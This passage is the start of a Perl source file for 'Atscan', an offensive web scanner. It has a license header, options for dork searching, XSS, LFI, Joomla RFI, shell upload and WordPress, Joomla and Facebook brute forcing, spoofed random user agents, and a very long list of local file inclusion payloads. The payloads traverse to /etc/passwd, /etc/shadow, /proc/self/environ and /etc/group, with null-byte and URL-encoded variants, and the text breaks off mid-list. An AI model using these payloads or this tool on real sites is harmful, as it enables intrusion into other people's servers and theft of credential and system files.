#!/usr/bin/perl
#
############################################################################################################################################################################################
## License   ###############################################################################################################################################################################
# This software is Copyright (c) 2015 Alisam Technology
# Tool coded by Ali Mehdioui.
#
# This is free software, licensed under:
#
#  The Artistic License 2.0
#
# The Artistic License
#
# Copyright (c) 2000-2006, The Perl Foundation.
#
# Preamble
#   This license establishes the terms under which a given free software Package may be copied, modified, distributed, and/or redistributed. The intent is that the Copyright Holder maintains
#   some artistic control over the development of that Package while still keeping the Package available as open source and free software.
#   You are always permitted to make arrangements wholly outside of this license directly with the Copyright Holder of a given Package. If the terms of this license do not permit 
#   the full use that you propose to make of the Package, you should contact the Copyright Holder and seek a different licensing arrangement.
#
# Definitions
#   Copyright Holder means the individual(s) or organization(s) named in the copyright notice for the entire Package.
#   Contributor means any party that has contributed code or other material to the Package, in accordance with the Copyright Holder's procedures.
#   You and your means any person who would like to copy, distribute, or modify the Package.
#   Package means the collection of files distributed by the Copyright Holder, and derivatives of that collection and/or of those files. A given Package may consist of either the Standard 
#   Version, or a Modified Version.
#   Distribute means providing a copy of the Package or making it accessible to anyone else, or in the case of a company or organization, to others outside of your company or organization.
#   Distributor Fee means any fee that you charge for Distributing this Package or providing support for this Package to another party. It does not mean licensing fees.
#   Standard Version refers to the Package if it has not been modified, or has been modified only in ways explicitly requested by the Copyright Holder.
#   Modified Version means the Package, if it has been changed, and such changes were not explicitly requested by the Copyright Holder.
#   Original License means this Artistic License as Distributed with the Standard Version of the Package, in its current version or as it may be modified by The Perl Foundation 
#   in the future.
#   Source form means the source code, documentation source, and configuration files for the Package.
#   Compiled form means the compiled bytecode, object code, binary, or any other form resulting from mechanical transformation or translation of the Source form.
#
# Permission for Use and Modification Without Distribution
# (1) You are permitted to use the Standard Version and create and use Modified Versions for any purpose without restriction, provided that you do not Distribute the Modified Version.
#    Permissions for Redistribution of the Standard Version
# (2) You may Distribute verbatim copies of the Source form of the Standard Version of this Package in any medium without restriction, either gratis or for a Distributor Fee, provided that
#    you duplicate all of the original copyright notices and associated disclaimers. At your discretion, such verbatim copies may or may not include a Compiled form of the Package.
#
# (3) You may apply any bug fixes, portability changes, and other modifications made available from the Copyright Holder. The resulting Package will still be considered the Standard
#     Version, and as such will be subject to the Original License.
#     Distribution of Modified Versions of the Package as Source
#	 
# (4) You may Distribute your Modified Version as Source (either gratis or for a Distributor Fee, and with or without a Compiled form of the Modified Version) provided that you clearly
#     document how it differs from the Standard Version, including, but not limited to, documenting any non-standard features, executables, or modules, and provided that you do at least ONE
#     of the following:
#       (a) make the Modified Version available to the Copyright Holder of the Standard Version, under the Original License, so that the Copyright Holder may include
#	     your modifications in the Standard Version.
#		 
#       (b) ensure that installation of your Modified Version does not prevent the user installing or running the Standard Version. In addition, the Modified Version must bear a name that is
#          different from the name of the Standard Version.
#	   
#       (c) allow anyone who receives a copy of the Modified Version to make the Source form of the Modified Version available to others under the Original License or
#          a license that permits the licensee to freely copy, modify and redistribute the Modified Version using the same licensing terms that apply to the copy that 
#	       the licensee     received, and requires that the Source form of the Modified Version, and of any works derived from it, be made freely available in that license 
#		   fees are prohibited but Distributor Fees are allowed.
#          Distribution of Compiled Forms of the Standard Version or Modified Versions without the Source
#		 
# (5) You may Distribute Compiled forms of the Standard Version without the Source, provided that you include complete instructions on how to get the Source of the Standard Version. 
#    Such  instructions must be valid at the time of your distribution. If these instructions, at any time while you are carrying out such distribution, become invalid, 
#	 you must provide new instructions on demand or cease further distribution. If you provide valid instructions or cease distribution within thirty days after you become aware 
#	 that the instructions are invalid, then you do not forfeit any of your rights under this license.
#
# (6) You may Distribute a Modified Version in Compiled form without the Source, provided that you comply with Section 4 with respect to the Source of the Modified Version.
#     Aggregating or Linking the Package
#	 
# (7) You may aggregate the Package (either the Standard Version or Modified Version) with other packages and Distribute the resulting aggregation provided that you 
#      do not charge a licensing fee for the Package. Distributor Fees are permitted, and licensing fees for other components in the aggregation are permitted. The terms of 
#      this license apply to the use and Distribution of the Standard or Modified Versions as included in the aggregation.
#
# (8) You are permitted to link Modified and Standard Versions with other works, to embed the Package in a larger work of your own, or to build stand-alone binary or 
#     bytecode versions of applications that include the Package, and Distribute the result without restriction, provided the result does not expose a direct interface to the Package.
#     Items That are Not Considered Part of a Modified Version
#	 
# (9) Works (including, but not limited to, modules and scripts) that merely extend or make use of the Package, do not, by themselves, cause the Package to 
#     be a Modified Version. In addition, such works are not considered parts of the Package itself, and are not subject to the terms of this license.
#     General Provisions
#	 
# (10) Any use, modification, and distribution of the Standard or Modified Versions is governed by this Artistic License. By using, modifying or distributing 
#     the Package, you accept this license. Do not use, modify, or distribute the Package, if you do not accept this license.
#
# (11) If your Modified Version has been derived from a Modified Version made by someone other than you, you are nevertheless required to ensure that your Modified 
#	  Version complies with the requirements of this license.
#	 
# (12) This license does not grant you the right to use any trademark, service mark, tradename, or logo of the Copyright Holder.
#  
# (13) This license includes the non-exclusive, worldwide, free-of-charge patent license to make, have made, use, offer to sell, sell, import and otherwise transfer the Package 
#    with respect to any patent claims licensable by the Copyright Holder that are necessarily infringed by the Package. If you institute patent litigation (including a cross-claim 
#	 or counterclaim) against any party alleging that the Package constitutes direct or contributory patent infringement, then this Artistic License to you shall terminate 
#	 on the date that such litigation is filed.
#
# (14) Disclaimer of Warranty: THE PACKAGE IS PROVIDED BY THE COPYRIGHT HOLDER AND CONTRIBUTORS "AS IS' AND WITHOUT ANY EXPRESS OR IMPLIED WARRANTIES. THE IMPLIED WARRANTIES
#    OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE, OR NON-INFRINGEMENT ARE DISCLAIMED TO THE EXTENT PERMITTED BY YOUR LOCAL LAW. UNLESS REQUIRED BY LAW, NO COPYRIGHT 
#	 HOLDER OR CONTRIBUTOR WILL BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, OR CONSEQUENTIAL DAMAGES ARISING IN ANY WAY OUT OF THE USE OF THE PACKAGE, EVEN IF ADVISED OF 
#	THE POSSIBILITY OF SUCH DAMAGE.
#The End
#
############################################################################################################################################################################################
############################################################################################################################################################################################
## REQUIREMENT
#Atscan Scanner
#Requiered libreries
#apt-get install libxml-simple-perl
#aptitude install libio-socket-ssl-perl
#aptitude install libcrypt-ssleay-perl
############################################################################################################################################################################################
############################################################################################################################################################################################
## MAKE OUTPUT DIRECTORY
my $outdir ="$Bin/output";
if (!-d $outdir) {
  mkdir $outdir, 0755;
}
############################################################################################################################################################################################
############################################################################################################################################################################################
use warnings;
use Term::ANSIColor;
############################################################################################################################################################################################
############################################################################################################################################################################################
## OPTIONS
use Getopt::Long ();
my $proxy;
my $help;
my $output;
my $replace;
my $with;
my $dork;
my $mlevel;
my $unique;
my $mxss;
my $Target;
my $validation_text;
my $exploit;
my $sqlmap;
my $p;
my $mlfi;
my $mjoomrfi;
my $shell;
my $mwpadf;
my $madmin;
my $msubdomain;
my $mports;
my $mstart;
my $mend;
my $mbasic;
my $muser;
my $mall;
my $msites;
my $mwpsites;
my $mjoomsites;
my $mupload;
my $mzip;
my $command;
my $mdom;
my $misup;
my $mabout;
my $checkversion;
my $mmd5;
my $mencode64;
my $mdecode64;
my $mmails;
my $rangip;
my $nobanner;
my $beep;
my $wpbf;
my $username;
my $password;
my $joombf;
my $ifinurl;
my $noinfo;
my $fbbf;

Getopt::Long::GetOptions(\my %OPT,
                        'proxy=s' => \$proxy,
                        'help' => \$help,
                        'save' => \$output,
                        'dork=s' => \$dork,
                        'level=s' => \$mlevel,
                        'xss' => \$mxss,
                        't=s' => \$Target,
                        'valid=s' => \$validation_text,
                        'exp=s' => \$exploit,
                        'sqlmap' => \$sqlmap,
                        'p=s' => \$p,
                        'lfi' => \$mlfi,
                        'joomrfi' => \$mjoomrfi,
                        'shell=s' => \$shell,
                        'wpadf' => \$mwpadf,
                        'admin' => \$madmin,
						'shost' => \$msubdomain,
						'ports' => \$mports,
						'select=s' => \$muser,
						'start=s' => \$mstart,
						'end=s' => \$mend,
						'all=s' => \$mall,
						'basic=s' => \$mbasic,
						'sites' => \$msites,
						'wp' => \$mwpsites,
						'joom' => \$mjoomsites,
						'upload' => \$mupload,
						'zip' => \$mzip,
						'encode64' => \$mencode64,
						'decode64' => \$mencode64,
						'command=s' => \$command,
						'dom' => \$mdom,
						'isup' => \$misup,
						'about' => \$mabout,
						'replace=s' => \$replace,
						'with=s' => \$with,
						'md5=s' => \$mmd5,
						'encode64=s' => \$mencode64,
						'decode64=s' => \$mdecode64,
						'email' => \$mmails,
						'update' => \$checkversion,
						'rang=s' => \$rangip,
						'nobanner' => \$nobanner,
						'beep' => \$beep,
						'wpbf' => \$wpbf,
						'joombf' => \$joombf,
						'user=s' => \$username,
						'pass=s' => \$password,
						'ifinurl=s' => \$ifinurl,
                        'noinfo' => \$noinfo,
						'unique' => \$unique,
                        'fbbf' => \$fbbf,
) or advise();
############################################################################################################################################################################################
############################################################################################################################################################################################
use IO::Socket::INET;
use LWP::UserAgent;
############################################################################################################################################################################################
############################################################################################################################################################################################
my @strings=('ar_JO', 'ar_KW', 'ar_LB', 'ar_LY', 'ar_MA', 'ar_OM', 'ar_QA', 'ar_SA', 'ar_SD', 'el_GR', 'el', 'iw_IL', 'iw', 'hi_IN', 'hu_HU', 'hu', 'is_IS', 'is', 'in_ID', 'cs-CZ', 'uk', 'vi_VN', 'vi', 'en-US', 'sk-SK', 'pt-BR', 'sq_AL', 'sq', 'ar_DZ', 'ar_BH', 'ar_EG', 'ar_IQ', 'be_BY', 'be', 'bg_BG', 'bg', 'ca_ES', 'ca', 'zh_CN', 'zh_HK', 'zh_SG', 'zh_TW', 'zh', 'hr_HR', 'hr', 'cs_CZ', 'cs', 'da_DK', 'da', 'nl_BE', 'nl_NL', 'nl', 'en_AU', 'en_CA', 'en_IN', 'en_IE', 'en_MT', 'en_NZ', 'en_PH', 'en_SG', 'en_ZA', 'en_GB', 'en_US', 'en', 'et_EE', 'et', 'fi_FI', 'fi', 'fr_BE', 'fr_CA', 'fr_FR', 'fr_LU', 'fr_CH', 'fr', 'de_AT', 'de_DE', 'de_LU', 'de_CH', 'de', 'el_CY', 'in', 'ga_IE', 'ga', 'it_IT', 'it_CH', 'it', 'ja_JP', 'ja_JP_JP', 'ja', 'ko_KR', 'ko', 'lv_LV', 'lv', 'lt_LT', 'lt', 'mk_MK', 'mk', 'ms_MY', 'ms', 'mt_MT', 'mt', 'no_NO', 'no_NO_NY', 'no', 'pl_PL', 'pl', 'pt_PT', 'pt', 'ro_RO', 'ro', 'ru_RU', 'ru', 'sr_BA', 'sr_ME', 'sr_CS', 'sr_RS', 'sr', 'sk_SK', 'sk', 'sl_SI', 'sl', 'es_AR', 'es_BO', 'es_CL', 'es_CO', 'es_CR', 'es_DO', 'es_EC', 'es_SV', 'es_GT', 'es_HN', 'es_MX', 'es_NI', 'es_PA', 'es_PY', 'es_PE', 'es_PR', 'es_ES', 'es_US', 'es_UY', 'es_VE', 'es', 'sv_SE', 'sv', 'th_TH', 'th_TH_TH', 'th', 'tr_TR', 'tr', 'uk_UA', 'uk');
$myrand = $strings[int rand @strings];
############################################################################################################################################################################################
############################################################################################################################################################################################
## SYSTEM RANDOM
my @sys=(
"",
"compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; $myrand",
"compatible; MSIE 7.0; Windows NT 5.1; $myrand",
"compatible; MSIE 6.0; Windows NT 5.1; $myrand",
"compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.1; $myrand;",
"compatible; Konqueror/3.5; $myrand; SunOS",
"compatible; Konqueror/3.5; $myrand; NetBSD 4.0_RC3; X11; $myrand",
"Macintosh; U; PPC Mac OS X 10_5_8; $myrand",
"Macintosh; Intel Mac OS X 10.6; $myrand; rv:21.0",
"Macintosh; Intel Mac OS X 10_9_0; $myrand",
"Macintosh; U; Intel Mac OS X 10_6_6; $myrand",
"X11; Linux 3.5.4-1-ARCH i686; $myrand",
"Linux; U; Android 4.2.2; $myrand; LNV-Lenovo K910e/S100; 1080*1920; CTC/2.0; $myrand",
"iPad; CPU OS 6_0 like Mac OS X; $myrand",
"Windows NT 5.1; $myrand",
"Windows; I; Windows NT 5.1; $myrand; rv:1.9.2.13",
"Windows NT 6.1; $myrand; rv:24.0",
"Windows NT 6.1; WOW64; $myrand",
"Windows NT 6.2; WOW64; $myrand; rv:16.0.1",
"Windows 2000; WOW64; $myrand; rv:16.0.1",
"Windows 98; WOW64; $myrand; rv:16.0.1",
"Windows 95; WOW64; $myrand; rv:16.0.1"
);        
############################################################################################################################################################################################
############################################################################################################################################################################################
## BROWSER RANDOM
my @vary=(
"",
"KHTML/3.5.7 (like Gecko)",
"Opera",
"SeaMonkey",
"Safari",
"Dragon",
"GNU IceCat",
"Seamonkey",
"Galaxy",
"GoogleBot",
"Tor Browser",
"Bimbot",
"Konqueror",
"Flock",
"Chrome",
"Mobile",
"AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",
"AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.101 Safari/537.36",
"AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safa",
"AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25",
"Gecko/20100101 Firefox/21.0",
"Gecko/20100101 Firefox/24.0",
"Gecko/20121011 Firefox/16.0.1",
"KHTML/4.9.1 (like Gecko) Konqueror/4.9"
);        
my $agent = "Mozilla/5.0 (".$sys[int rand @sys].";) ".$vary[int rand @vary];
my $ua = LWP::UserAgent->new(
         agent		=> $agent,
		 cookie_jar	=> HTTP::Cookies->new(),
);
$ua->env_proxy;
$ua->timeout(10);
use HTTP::Cookies;
use File::Basename;
use FindBin '$Bin';
system(($^O eq 'MSWin32') ? 'cls' : 'clear');
############################################################################################################################################################################################
############################################################################################################################################################################################
## LFI
sub LFI {@LFI =("/passwd.txt", "/etc/passwd","../etc/passwd","../../etc/passwd","../../../etc/passwd","../../../../etc/passwd","../../../../../etc/passwd","../../../../../../etc/passwd","../../../../../../../etc/passwd","../../../../../../../../etc/passwd","../../../../../../../../../etc/passwd","../../../../../../../../../../etc/passwd","/etc/passwd%00","../etc/passwd%00","../../etc/passwd%00","../../../etc/passwd%00","../../../../etc/passwd%00","../../../../../etc/passwd%00","../../../../../../etc/passwd%00","../../../../../../../etc/passwd%00","../../../../../../../../etc/passwd%00","../../../../../../../../../etc/passwd%00","../../../../../../../../../../etc/passwd%00","....//etc/passwd","....//....//etc/passwd","....//....//....//etc/passwd","....//....//....//....//etc/passwd","....//....//....//....//....//etc/passwd","....//....//....//....//....//....//etc/passwd","....//....//....//....//....//....//....//etc/passwd","....//....//....//....//....//....//....//....//etc/passwd","....//....//....//....//....//....//....//....//....//etc/passwd","....//....//....//....//....//....//....//....//....//....//etc/passwd","....//etc/passwd%00","....//....//etc/passwd%00","....//....//....//etc/passwd%00","....//....//....//....//etc/passwd%00","....//....//....//....//....//etc/passwd%00","....//....//....//....//....//....//etc/passwd%00","....//....//....//....//....//....//....//etc/passwd%00","....//....//....//....//....//....//....//....//etc/passwd%00","....//....//....//....//....//....//....//....//....//etc/passwd%00","....//....//....//....//....//....//....//....//....//....//etc/passwd%00","%2Fetc%2Fpasswd","..%2Fetc%2Fpasswd","..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd","%2Fetc%2Fpasswd%00","..%2Fetc%2Fpasswd%00","..%2F..%2Fetc%2Fpasswd%00","..%2F..%2F..%2Fetc%2Fpasswd%00","..%2F..%2F..%2F..%2Fetc%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00","....%2f%2Fetc/passwd","....%2f%2F....%2f%2Fetc/passwd","....%2f%2F....%2f%2F....%2f%2Fetc/passwd","....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd","....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00","/proc/self/environ","../proc/self/environ","../../proc/self/environ","../../../proc/self/environ","../../../../proc/self/environ","../../../../../proc/self/environ","../../../../../../proc/self/environ","../../../../../../../proc/self/environ","../../../../../../../../proc/self/environ","../../../../../../../../../proc/self/environ","../../../../../../../../../../proc/self/environ","/proc/self/environ%00","../proc/self/environ%00","../../proc/self/environ%00","../../../proc/self/environ%00","../../../../proc/self/environ%00","../../../../../proc/self/environ%00","../../../../../../proc/self/environ%00","../../../../../../../proc/self/environ%00","../../../../../../../../proc/self/environ%00","../../../../../../../../../proc/self/environ%00","../../../../../../../../../../proc/self/environ%00","%2Fproc%2Fself%2Fenviron","..%2Fproc%2Fself%2Fenviron","..%2F..%2Fproc%2Fself%2Fenviron","..%2F..%2F..%2Fproc%2Fself%2Fenviron","..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron","..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron","..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron","%2Fproc%2Fself%2Fenviron%00","..%2Fproc%2Fself%2Fenviron%00","..%2F..%2Fproc%2Fself%2Fenviron%00","..%2F..%2F..%2Fproc%2Fself%2Fenviron%00","..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron%00","..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron%00","..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron%00","//proc/self/environ","....//proc/self/environ","....//....//proc/self/environ","....//....//....//proc/self/environ","....//....//....//....//proc/self/environ","....//....//....//....//....//proc/self/environ","....//....//....//....//....//....//proc/self/environ","....//....//....//....//....//....//....//proc/self/environ","....//....//....//....//....//....//....//....//proc/self/environ","....//....//....//....//....//....//....//....//....//proc/self/environ","....//....//....//....//....//....//....//....//....//....//proc/self/environ","//proc/self/environ%00","....//proc/self/environ%00","....//....//proc/self/environ%00","....//....//....//proc/self/environ%00","....//....//....//....//proc/self/environ%00","....//....//....//....//....//proc/self/environ%00","....//....//....//....//....//....//proc/self/environ%00","....//....//....//....//....//....//....//proc/self/environ%00","....//....//....//....//....//....//....//....//proc/self/environ%00","....//....//....//....//....//....//....//....//....//proc/self/environ%00","....//....//....//....//....//....//....//....//....//....//proc/self/environ%00","%2f%2Fproc/self/environ","....%2f%2Fproc/self/environ","....%2f%2F....%2f%2Fproc/self/environ","....%2f%2F....%2f%2F....%2f%2Fproc/self/environ","....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ","%2f%2Fproc/self/environ%00","....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2F....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F..<!---->..%2f%2F....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ%00","/etc/shadow","../etc/shadow","../../etc/shadow","../../../etc/shadow","../../../../etc/shadow","../../../../../etc/shadow","../../../../../../etc/shadow","../../../../../../../etc/shadow","../../../../../../../../etc/shadow","../../../../../../../../../etc/shadow","../../../../../../../../../../etc/shadow","/etc/shadow%00","../etc/shadow%00","../../etc/shadow%00","../../../etc/shadow%00","../../../../etc/shadow%00","../../../../../etc/shadow%00","../../../../../../etc/shadow%00","../../../../../../../etc/shadow%00","../../../../../../../../etc/shadow%00","../../../../../../../../../etc/shadow%00","../../../../../../../../../../etc/shadow%00","%2Fetc..%2Fshadow","..%2Fetc%2Fshadow","..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow","%2Fetc..%2Fshadow%00","..%2Fetc%2Fshadow%00","..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow%00","%2F%2Fetc/shadow","....%2f%2Fetc/shadow","....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow","%2F%2Fetc/shadow%00","....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....//etc/shadow","....//....//etc/shadow","....//....//....//etc/shadow","....//....//....//....//etc/shadow","....//....//....//....//....//etc/shadow","....//....//....//....//....//....//etc/shadow","....//....//....//....//....//....//....//etc/shadow","....//....//....//....//....//....//....//....//etc/shadow","....//....//....//....//....//....//....//....//....//etc/shadow","....//....//....//....//....//....//....//....//....//....//etc/shadow","....//etc/shadow%00","....//....//etc/shadow%00","....//....//....//etc/shadow%00","....//....//....//....//etc/shadow%00","....//....//....//....//....//etc/shadow%00","....//....//....//....//....//....//etc/shadow%00","....//....//....//....//....//....//....//etc/shadow%00","....//....//....//....//....//....//....//....//etc/shadow%00","....//....//....//....//....//....//....//....//....//etc/shadow%00","....//....//....//....//....//....//....//....//....//....//etc/shadow%00","/etc/group","../etc/group","../../etc/group","../../../etc/group","../../../../etc/group","../../../../../etc/group","../../../../../../etc/group","../../../../../../../etc/group","../../../../../../../../etc/group","../../../../../../../../../etc/group","../../../../../../../../../../etc/group","/etc/group%00","../etc/group%00","../../etc/group%00","../../../etc/group%00","../../../../etc/group%00","../../../../../etc/group%00","../../../../../../etc/group%00","../../../../../../../etc/group%00","../../../../../../../../etc/group%00","../../../../../../../../../etc/group%00","../../../../../../../../../../etc/group%00","%2Fetc..%2Fgroup","..%2Fetc%2Fgroup","..%2F..%2Fetc%2Fgroup","..%2F..%2F..%2Fetc%2Fgroup","..%2F..%2F..%2F..%2Fetc%2Fgroup","..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup","%2Fetc%2Fgroup%00","..%2Fetc%2Fgroup%00","..%2F..%2Fetc%2Fgroup%00","..%2F..%2F..%2Fetc%2Fgroup%00","..%2F..%2F..%2F..%2Fetc%2Fgroup%00","..%2F..%2F..%2F..%2F..%2Fetc%